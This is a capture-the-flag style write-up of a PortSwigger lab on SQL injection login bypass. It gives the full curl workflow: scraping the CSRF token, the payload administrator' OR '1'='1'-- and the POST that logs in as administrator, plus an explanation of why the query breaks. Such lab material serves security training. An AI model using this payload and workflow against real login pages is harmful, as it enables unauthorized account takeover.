#Lab Information

Platform: PortSwigger Web Security Academy
Lab: SQL injection vulnerability allowing login bypass
Target: PortSwigger Web Security Academy lab environment
Environment: iPhone + iSH + Alpine Linux
Tools: curl, grep, sed
Status: Solved

⸻

#Objective

The objective of this lab was to exploit a SQL injection vulnerability in the application’s login mechanism and authenticate as the administrator user without knowing the legitimate password.

The entire lab was performed from an iPhone using iSH rather than a traditional desktop penetration-testing environment.

⸻

1. Reconnaissance

I started by sending an HTTP request to the target using curl:

curl -i "https://TARGET/

The response confirmed that the target was a PortSwigger SQL injection lab.
I then investigated the application’s login functionality and identified the /login endpoint.

⸻

2. Identifying the Login Form

The login page was retrieved with:

curl -s "https://TARGET/login"

The HTML contained a login form using the POST method:

<form class=login-form method=POST action="/login">

The form accepted three relevant parameters:

csrf
username
password

This established that authentication was performed through:

POST /login

environment.

⸻

3. Handling the CSRF Token

The application included a CSRF token, so I first retrieved the login page while saving the session cookies:

curl -s -c cookies.txt \
"https://TARGET/login" \
-o login.html

The CSRF token was extracted from the HTML:

grep -o 'name="csrf" value="[^"]*"' login.html

then stored the token in a shell variable:

CSRF=$(grep -o 'name="csrf" value="[^"]*"' login.html \
| sed 's/.*value="//;s/"$//')

The session cookies were stored in cookies.txt and reused for the subsequent authentication request.

⸻

4. Testing the SQL Injection

The username parameter was tested with the following payload:

administrator' OR '1'='1'--

The login request was manually constructed with curl:

curl -i -b cookies.txt -c cookies.txt \
-X POST \
"https://TARGET/login" \
--data-urlencode "csrf=$CSRF" \
--data-urlencode "username=administrator' OR '1'='1'--" \
--data-urlencode "password=x"

The password was intentionally set to an invalid value because the objective was to bypass the password verification.

⸻

5. Understanding the Injection

A vulnerable authentication query could conceptually resemble:

SELECT * FROM users
WHERE username = 'USER_INPUT'
AND password = 'PASSWORD_INPUT';

The supplied username:

administrator' OR '1'='1'--

changes the structure of the query.
Conceptually, it can result in something similar to:

SELECT * FROM users
WHERE username = 'administrator'
OR '1'='1'--'
AND password = 'x';

The injection consists of three important components:
String termination
'
This closes the original username string.

Always-true condition
OR '1'='1'
This introduces a condition that evaluates to true.

SQL comment
--
This comments out the remaining portion of the SQL statement.
Because the application failed to properly separate user input from SQL syntax, the injected input altered the logic of the authentication query.

⸻

6. Successful Authentication
The server responded with an HTTP redirect:

HTTP/2 302
Location: /my-account?id=administrator

A session cookie was also issued.
This indicated that the application had accepted the authentication request and redirected the session to the administrator's account page.

⸻

7. Verifying Administrator Access
I reused the authenticated session cookie to request the account page:

curl -s -b cookies.txt \
"https://TARGET/my-account?id=administrator"

The response contained:

My Account

Your username is: administrator

This confirmed that the session was authenticated as the administrator.
The PortSwigger lab subsequently reported that the lab had been successfully solved

